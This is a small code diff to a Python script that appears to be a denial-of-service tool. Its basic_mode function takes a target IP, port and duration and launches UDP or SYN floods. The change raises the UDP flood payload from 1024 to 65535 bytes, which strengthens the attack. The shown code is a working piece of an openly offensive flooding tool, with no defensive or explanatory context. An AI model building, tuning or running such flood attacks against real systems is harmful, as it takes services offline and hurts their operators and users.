@@ -109,7 +109,7 @@ def main():
 def basic_mode():
     ip, port, duration, attack_type = get_user_input()
     if attack_type == "1":
-        udp_flood(ip, port, duration, threads=1, bytes_to_send=1024)
+        udp_flood(ip, port, duration, threads=1, bytes_to_send=65535)
     elif attack_type == "2":
         syn_flood(ip, port, duration, threads=1)
     elif attack_type == "3":
